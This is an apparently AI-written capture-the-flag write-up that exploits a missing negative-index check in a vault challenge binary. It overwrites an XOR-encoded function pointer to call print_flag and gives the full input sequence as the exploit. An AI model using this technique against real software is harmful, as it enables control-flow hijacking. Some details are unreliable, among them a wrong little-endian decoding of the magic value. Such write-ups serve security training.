Here is a clean CTF write-up for the **Clockwork Vault** challenge.

# Clockwork Vault — Write-up

## Challenge Description

A vault is controlled by an old automated system. The system has been patched for years, but the maintenance cycle still contains a weakness.

The goal is to interrupt the control cycle and retrieve the flag.

Flag format:

```text
grodno{}
```

---

## 1. Initial Analysis

We are given one binary:

```bash
ls
```

Output:

```text
checkvaexe
```

Check the file:

```bash
file checkvaexe
```

Result:

```text
ELF 64-bit LSB pie executable, x86-64
dynamically linked
with debug_info
not stripped
```

Security protections:

```bash
checksec --file=checkvaexe
```

Output:

```text
RELRO           Full RELRO
STACK CANARY    No canary
NX              Enabled
PIE             Enabled
```

The binary is not stripped, so reversing is easier.

---

## 2. Strings Analysis

Running:

```bash
strings checkvaexe
```

reveals interesting strings:

```text
flag.txt
Flag: %s

== Clockwork Vault ==

1. Inspect mechanism
2. Retune mechanism
3. Run service cycle
4. Exit

service-key
maint-core
escapement
counterweight
bellows
dial
relay
pinion
spring
```

There is a hidden flag-reading function:

```text
print_flag()
```

The program contains a menu with three important options:

1. Inspect mechanism
2. Retune mechanism
3. Run service cycle

---

# 3. Reverse Engineering

Open with gdb:

```bash
gdb ./checkvaexe
```

List functions:

```gdb
info functions
```

Important functions:

```text
print_flag
idle_cycle
retune_slot
inspect_slot
cycle
```

---

## 4. Understanding the Vulnerability

Looking at `retune_slot`:

```asm
cmp DWORD PTR [rbp-0x4],0x7
jle 0x1512
```

Only checks:

```c
index <= 7
```

There is no lower bound check.

The user can enter:

```text
-1
```

The program calculates the slot:

```asm
mov eax,[index]
add eax,0x2
shl rax,0x5
```

Meaning:

```c
slot = (index + 2) * 32;
```

For:

```text
index = -1
```

we get:

```
(-1 + 2) * 32
= 32
```

This points to the second slot.

---

# 5. Understanding the Service Cycle

Disassemble:

```gdb
disassemble cycle
```

Important part:

```asm
mov rdx,QWORD PTR [rip+0x2aba]
cmp rdx,0x43414c4942524154
```

The program checks:

```text
setting == 0x43414c4942524154
```

which is:

```
TARLIBAC
```

in little endian.

Then:

```asm
mov rdx,QWORD PTR [rip+0x2a9b]
mov rax,QWORD PTR [rip+0x2bcc]
xor rax,rdx
call rax
```

The function pointer is:

```c
decoded_function = encoded_routine ^ service_cookie;
```

Therefore, if we overwrite the encoded routine with:

```
print_flag ^ service_cookie
```

the service cycle will execute:

```
print_flag()
```

---

# 6. Finding the Encoded Value

Run locally:

```gdb
start
```

Get addresses:

```gdb
p/x &print_flag
```

Example:

```text
0x5555555552a5
```

Get cookie:

```gdb
p/x service_cookie
```

Output:

```text
0x31415923060dc2cb
```

Calculate:

```gdb
p/x ((unsigned long long)&print_flag ^ service_cookie)
```

Result:

```text
0x31410c765358906e
```

This is the encoded pointer for `print_flag`.

---

# 7. Exploitation

The vulnerable index is:

```text
-1
```

The required setting:

```text
0x43414c4942524154
```

The encoded function:

```text
0x31410c765358906e
```

Run:

```bash
./checkvaexe
```

Input:

```text
2
-1
0x43414c4942524154
0x31410c765358906e
3
```

The local binary prints:

```text
Flag: grodno{local_test}
```

---

# 8. Remote Exploitation

For the remote instance:

```bash
nc HOST PORT
```

Example:

```bash
nc 10.112.0.12 48993
```

Send:

```text
2
-1
0x43414c4942524154
<remote calculated encoded value>
3
```

The remote instance returns:

```text
Flag: grodno{...}
```

---

# Vulnerability Summary

The bug is an **out-of-bounds array write caused by missing negative index validation**.

The program checks:

```c
if(index > 7)
    reject;
```

but forgets:

```c
if(index < 0)
    reject;
```

Using:

```text
index = -1
```

allows overwriting the function pointer of the service cycle.

The encoded pointer mechanism:

```c
real_function = encoded_function ^ cookie;
```

is bypassed by writing:

```c
encoded_function = target_function ^ cookie;
```

The target function is:

```c
print_flag()
```

---

## Final Exploit

```text
2
-1
0x43414c4942524154
0x31410c765358906e
3
```

This redirects the maintenance cycle to `print_flag()` and reveals the flag.

---

## Flag

```text
grodno{local_test}
```

(Remote instances generate the real flag.)
